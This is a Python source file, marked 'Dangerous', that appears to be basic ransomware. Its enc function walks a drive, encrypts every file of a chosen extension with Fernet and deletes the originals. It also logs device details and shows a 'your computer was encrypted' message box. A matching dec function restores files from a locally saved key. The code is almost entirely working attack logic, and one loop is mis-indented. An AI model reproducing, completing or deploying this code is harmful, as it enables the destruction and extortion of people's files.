# !!! Dangerous !!!

# https://github.com/MMErfani/
from subprocess import check_output
from cryptography.fernet import Fernet
import os
import platform

def enc(target_file_extention, encrypted_file_extention="maher", key=1, drive="D"):
    if key == 1:  
        key = Fernet.generate_key()

    Encrypt = Fernet(key)

    key_file = open("key", "w")   #just for test
    key_file.write(str(key))      #just for test
    key_file.close()

    device_info = platform.uname()
        for data in device_info:
            info_file = open("device_info", "a")
            info_file.write(str(data) + "\n")
            info_file.close()

    cmd = check_output(f"{drive}: dir /S /B *.{target_file_extention}", shell=True).decode().split() 
    try:
        for i in cmd:
            try:
                with open(i, "rb") as thisfile:
                    data = thisfile.read()
                    enc_data = Encrypt.encrypt(data)
                    new_file = open(i+f".{encrypted_file_extention}", "wb")
                    new_file.write(enc_data)
                    thisfile.close()
                    new_file.close()
                    os.remove(i)
                    print(i + "------------> " + "Encrypted")
            except:
                pass

        if platform.uname()[0] == "Windows":
            import win32api
            win32api.MessageBox(0, 'Part/All of your computer was encrypted!', 'title')

    except:
        pass

def dec(encrypted_file_extention="maher", key=1, drive="D"):
    if key == 1:
        keyfile = open("key", "r")
        key = keyfile.read()
        key = b"%s" % bytes(key.split("'")[1].encode())
        print(key)


    
    Decrypt = Fernet(key)

    cmd = check_output(f"{drive}: && dir /S /B *.{encrypted_file_extention}", shell=True).decode().split()

    try:
        for i in cmd:
                try:
                    with open(i, "rb") as thisfile:
                        data = thisfile.read()
                        dec_data = Decrypt.decrypt(data)
                        new_file = open(i.replace(f".{encrypted_file_extention}", ""), "wb")
                        new_file.write(dec_data)
                        thisfile.close()
                        new_file.close()
                        os.remove(i)
                        print(i + "------------> " + "Decrypted")
                except:
                    pass
        if platform.uname()[0] == "Windows":
            import win32api
            win32api.MessageBox(0, 'Part/All of your computer was decrypted!', 'title')


    except:
        pass


